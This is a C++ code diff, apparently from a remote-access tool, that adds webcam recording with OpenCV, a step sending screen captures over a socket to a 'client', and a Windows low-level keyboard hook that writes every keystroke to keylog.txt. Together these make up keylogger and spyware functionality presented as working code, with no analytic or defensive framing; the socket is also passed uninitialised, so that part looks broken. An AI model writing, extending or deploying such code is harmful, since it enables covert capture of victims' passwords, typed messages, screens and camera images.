@@ -1,5 +1,10 @@
 #include "lib.cpp"
 #include <gdiplus.h>
+#include <opencv2/opencv.hpp>
+#include <opencv2/core.hpp>
+#include <opencv2/highgui.hpp>
+#include <opencv2/imgcodecs.hpp>
+// #define S_OK 0
 
 // Support both Linux and Windows machine
 #ifdef _WIN32
@@ -148,12 +153,136 @@ void captureScreen(const string &file_path){
     Bitmap bmp(hbmScreen, NULL);
     std::wstring wide_path(file_path.begin(), file_path.end());
     bmp.Save(wide_path.c_str(), &encoderID, NULL);
+    SOCKET s;
+
+    if(sendDataToClient(s, file_path))
+        cout << "Screen capture has been sent to client!" << endl;
+    else
+        cout << "Sending fail!" << endl;
+
     //clean up
     SelectObject(hdcMemDC, holdBitmap);
     DeleteObject(hbmScreen);
     DeleteDC(hdcMemDC);
     ReleaseDC(NULL, hdcScreen);
     GdiplusShutdown(gdipToken);
+}
+
+
+//Recording Webcam
+void recordVideo(const std::string& outputFileName, int frameWidth, int frameHeight) {
+    //Open webcam
+    cv::VideoCapture cap(0);
+    
+    // Check if the camera opened successfully
+    if (!cap.isOpened()) {
+        std::cerr << "Error: Could not open camera." << std::endl;
+        return;
+    }
+
+    // Create a VideoWriter object to save the video to a file
+    cv::VideoWriter writer(outputFileName, cv::VideoWriter::fourcc('M','J','P','G'), 30, cv::Size(frameWidth, frameHeight));
+
+    // Check if the writer is opened successfully
+    if (!writer.isOpened()) {
+        std::cerr << "Error: Could not open the video file for writing." << std::endl;
+        return;
+    }
+
+    // Start capturing and writing frames to the file
+    cv::Mat frame;
+    while (true) {
+        // Capture a new frame from the webcam
+        cap >> frame;
+
+        // If the frame is empty, break out of the loop
+        if (frame.empty()) {
+            std::cerr << "Error: Failed to capture frame." << std::endl;
+            break;
+        }
+        // Write the frame to the video file
+        writer.write(frame);
+
+        // Display the frame in a window
+        cv::imshow("Recording", frame);
+
+        // Break the loop if the user presses the 'q' key
+        if (cv::waitKey(1) == 'q') {
+            break;
+        }
+    }
+
+    // Release the camera and writer when done
+    cap.release();
+    writer.release();
+
+    // Close all OpenCV windows
+    cv::destroyAllWindows();
+}
+
+void saveRecording(){
+    cv::VideoCapture cap(0);
+    if (!cap.isOpened()) {
+        std::cerr << "Error: Could not open camera." << std::endl;
+        return;
+    }
+
+    // Get the frame width and height
+    int frameWidth = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
+    int frameHeight = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
+
+    // Call the recordVideo function
+    recordVideo("output.avi", frameWidth, frameHeight);
+
+}
+
+//capture key stroke
+void Keystroke(int key){
+    ofstream logfile;
+    logfile.open("keylog.txt", ios::app);
+
+    if(key == VK_BACK)
+        logfile << "[BACKSPACE]";
+    else if(key == VK_RETURN)
+        logfile << "[ENTER]";
+    else if(key == VK_SPACE)
+        logfile << " ";
+    else if(key == VK_TAB)
+        logfile << "[TAB]";
+    else if(key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
+        logfile << "[SHIFT]";
+    else if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
+        logfile << "[CTRL]";
+    else if(key == VK_ESCAPE)
+        logfile << "[ESC]";
+    else if(key == VK_OEM_PERIOD)
+        logfile << ".";
+    else if(key >= 'A' && key <= 'Z')
+        logfile << (char)key;
+    else if(key >= '0' && key <= '9')
+        logfile << (char)key;
+    else
+        logfile << "[" << key << "]";
+    logfile.close();
+}
+
+LRESULT CALLBACK KeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam){
+    if(nCode >= 0 && wParam == WM_KEYDOWN){
+        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
+        int key = pKeyBoard->vkCode;
+        Keystroke(key);
+    }
+    return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+//logKeyStrokeFunction
+void logKeyStroke(){
+    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardProc, NULL, 0);
+    MSG msg;
+    while(GetMessage(&msg, NULL, 0, 0)){
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    UnhookWindowsHookEx(keyboardHook);
 }
 
 int main() {
